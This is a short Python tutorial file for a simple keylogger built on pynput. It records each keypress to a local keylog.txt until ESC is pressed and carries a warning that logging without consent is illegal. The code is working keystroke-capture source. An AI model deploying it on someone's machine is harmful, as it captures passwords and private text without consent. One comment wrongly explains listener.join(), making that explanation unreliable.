# Keylogger tutorial 1
# A keylogger is a program that records the keystrokes on a computer
# This is a simple keylogger that records the keystrokes and writes them to a file
# we will use the pynput library to record the keystrokes
# pynput is a library that allows you to control and monitor input devices
# To install pynput use the command pip install pynput or py -m pip install pynput

'''‚ùå Warning: Keylogging without consent is illegal! and can lead to serious consequences.(fines, imprisonment, etc.)
You should never use this code to log someone's keystrokes without their permission.
Use it only for ethical hacking, forensics, or educational purposes.'''

from pynput import keyboard # Import the keyboard module from the pynput library

def keyPressed(key): # Define a function that will be called when a key is pressed
    """Function to log keypresses."""
    print(str(key)) # Print the key that was pressed

    # create a file and open it in append mode to record the keypress
    with open("keylog.txt", "a") as file: # will create a file called keylog.txt in the same directory as the script
        file.write(str(key)) # Write the key to the file as a string

    # Stop when 'ESC' is pressed
    if key == keyboard.Key.esc:
        print("\nESC key detected. Stopping the keylogger...")
        listener.stop() # Stop the listener 

# Start the listener
listener = keyboard.Listener(on_press=keyPressed) # listener instance that will call the keyPressed function when a key is pressed
listener.start() # Start the listener 
listener.join()  # Keeps the program running until ESC is pressed it also adds single quotes (' ') to each key to make sure the keys are joined together

print("Keylogger stopped.")
